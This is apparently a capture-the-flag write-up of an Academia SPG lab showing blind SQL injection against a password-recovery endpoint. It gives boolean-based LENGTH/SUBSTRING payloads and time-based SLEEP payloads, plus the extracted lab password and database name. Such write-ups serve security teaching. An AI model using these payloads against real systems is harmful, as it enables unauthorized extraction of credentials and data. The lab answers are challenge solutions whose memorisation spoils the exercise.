# 💉 Blind SQL Injection (Boolean & Time-Based) — Academia SPG Challenge

[![Platform](https://img.shields.io/badge/-Academia_SPG-0078D4?style=for-the-badge&logoColor=white)](https://academiaspg.com/labs/red-sqli-blind-1) [![Difficulty](https://img.shields.io/badge/-Advanced-FF0000?style=for-the-badge&logoColor=white)](https://github.com/alexrepsec/sqli-blind-boolean-temporal-write-up) [![Category](https://img.shields.io/badge/-SQL_Injection-6A0DAD?style=for-the-badge&logoColor=white)](https://github.com/alexrepsec/sqli-blind-boolean-temporal-write-up) [![MITRE](https://img.shields.io/badge/MITRE%20ATT%26CK-FF6600?style=for-the-badge&logoColor=white)](https://attack.mitre.org/)

---

## 📋 Scenario

> A password-recovery endpoint queries the database directly with unsanitized input, but the HTTP response never reflects any data back to the client. The goal is to prove the injection is exploitable end-to-end by blindly inferring, one bit at a time, information that is never displayed: the length of the admin password, the password itself, and the name of the backend database.

**Target endpoint:** `POST /recuperar`
**Vulnerable parameter:** `user`
**Backend:** MySQL / MariaDB (confirmed via `LENGTH()`, `SUBSTRING()`, `SLEEP()` behavior)
**Oracles available:** Boolean (`{"login":"existe"}` / `{"login":"no existe"}`) and Time-based (`IF(condition, SLEEP(3), 0)`)

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| Burp Suite / browser dev tools | Crafting and replaying `POST /recuperar` requests with injected payloads |
| Raw HTTP capture (`.txt`) | Baseline evidence of boolean and time-based server responses |
| Manual blind SQL injection | `LENGTH()`, `SUBSTRING()`, `IF()`, `SLEEP()` — MySQL/MariaDB functions |
| Response-time measurement | Distinguishing `~0.02s` (false) from `~3.01s` (true) once the boolean oracle disappears |

---

## 🔍 Investigation

### Step 1 — Establishing the boolean oracle

The endpoint never leaks data directly, but it does change its JSON response depending on whether the injected condition is true or false. This is the foundation for every subsequent query: inject a condition into the `user` parameter and read `"existe"` as TRUE, `"no existe"` as FALSE.

```sql
-- user = admin' AND LENGTH(password)=8-- -
SELECT * FROM users
WHERE username = 'admin' AND LENGTH(password) = 8-- -' AND password_hash = '';
```

---

### Q1 — How many characters does the admin password have?

Before brute-forcing the password itself, its length has to be known so the right number of positions can be targeted. This was done by injecting `LENGTH(password)=n` for increasing values of `n` and watching for the one value that flips the oracle to `"existe"`.

```sql
SELECT * FROM users WHERE username = 'admin' AND LENGTH(password) = 6-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users WHERE username = 'admin' AND LENGTH(password) = 7-- -' AND password_hash = '';
-- {"login":"no existe"}

SELECT * FROM users WHERE username = 'admin' AND LENGTH(password) = 8-- -' AND password_hash = '';
-- {"login":"existe"}

SELECT * FROM users WHERE username = 'admin' AND LENGTH(password) = 9-- -' AND password_hash = '';
-- {"login":"no existe"}
```

Only `LENGTH(password) = 8` returned a TRUE oracle — every other tested length came back `"no existe"`.

> ✅ **Answer:**
>
> ```
> 8 characters
> ```

Full payload trail: [`payloads/01_length_oracle.sql`](payloads/01_length_oracle.sql)

---

### Q2 — What is the admin password?

With the length confirmed, each of the 8 positions was brute-forced individually using `SUBSTRING(password, position, 1) = 'x'`. For every position, one or two guesses returned `"no existe"` before the correct character flipped the response to `"existe"`.

```sql
SELECT * FROM users WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = 's'-- -' AND password_hash = '';
-- {"login":"existe"}   <- position 1 = 's'

SELECT * FROM users WHERE username = 'admin' AND SUBSTRING(password, 2, 1) = '3'-- -' AND password_hash = '';
-- {"login":"existe"}   <- position 2 = '3'
```

Repeating this for positions 1 through 8 and keeping only the character that triggered `"existe"` at each step reconstructs the password in order:

| Position | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 |
|---|---|---|---|---|---|---|---|---|
| Character | `s` | `3` | `c` | `r` | `3` | `t` | `4` | `2` |

> ✅ **Answer:**
>
> ```
> s3cr3t42
> ```

Full payload trail: [`payloads/02_password_extraction.sql`](payloads/02_password_extraction.sql)

---

### Q3 — What is the name of the backend database?

At this point the response body stops being a usable signal — every request now returns an identical `200 OK` / `{"login":"no existe"}`. The oracle shifts from *what the response says* to *how long it takes to arrive*, using `IF(condition, SLEEP(3), 0)`.

```sql
SELECT * FROM users WHERE username = 'admin'
  AND IF(LENGTH(DATABASE()) = 8, SLEEP(3), 0)-- -' AND password_hash = '';
-- Response time: ~3.01s  <- condition is TRUE, DATABASE() has 8 characters
```

The same `SUBSTRING()` + `IF()` + `SLEEP()` pattern used for the password was then applied to `DATABASE()`, one position at a time, measuring response latency instead of reading the body:

| Position | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 |
|---|---|---|---|---|---|---|---|---|
| Character | `t` | `i` | `e` | `n` | `d` | `a` | `d` | `b` |

> ✅ **Answer:**
>
> ```
> tiendadb
> ```

Full payload trail: [`payloads/03_database_name_extraction.sql`](payloads/03_database_name_extraction.sql)

---

## 🗺️ Attack Chain Summary

```
POST /recuperar  (user parameter, unsanitized)
        │
        ▼
Injected ' AND <condition> -- -
        │
        ├──► Boolean oracle available?
        │        │
        │        ├─ YES → {"login":"existe"} / {"login":"no existe"}
        │        │        └─► LENGTH(password)    → password length = 8
        │        │        └─► SUBSTRING(password)  → password = s3cr3t42
        │        │
        │        └─ NO  → response body is constant, switch oracle
        │                 └─► IF(condition, SLEEP(3), 0)
        │                       └─► LENGTH(DATABASE())    → db name length = 8
        │                       └─► SUBSTRING(DATABASE()) → db name = tiendadb
        ▼
Full blind extraction without a single row of data ever being displayed
```

---

## 📌 IOCs

| Type | Value |
|---|---|
| Vulnerable endpoint | `POST /recuperar` |
| Injected parameter | `user` |
| Injection marker | `' AND <condition>-- -` |
| Boolean oracle (true) | `{"login":"existe"}` |
| Boolean oracle (false) | `{"login":"no existe"}` |
| Time-based oracle (true) | `~3.01s` response delay |
| Time-based oracle (false) | `~0.02s` response delay |
| Backend functions abused | `LENGTH()`, `SUBSTRING()`, `IF()`, `SLEEP()` |
| Admin password length | `8` |
| Admin password | `s3cr3t42` |
| Database name | `tiendadb` |

---

## 🧩 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Brute Force (blind inference) | T1110 |
| Collection | Data from Information Repositories | T1213 |
| Exfiltration | Exfiltration Over Alternative Protocol (inferred via timing channel) | T1048 |

**OWASP mapping:** A03:2021 – Injection

---

## 📚 References

- [Academia SPG — SQLi #2: a ciegas (booleana y temporal)](https://academiaspg.com/labs/red-sqli-blind-1)
- [OWASP — Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- [PortSwigger — Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
- [MITRE ATT&CK — Exploit Public-Facing Application (T1190)](https://attack.mitre.org/techniques/T1190/)

---

*Write-up by [alexrepsec](https://github.com/alexrepsec) — Academia SPG Red Team Series*
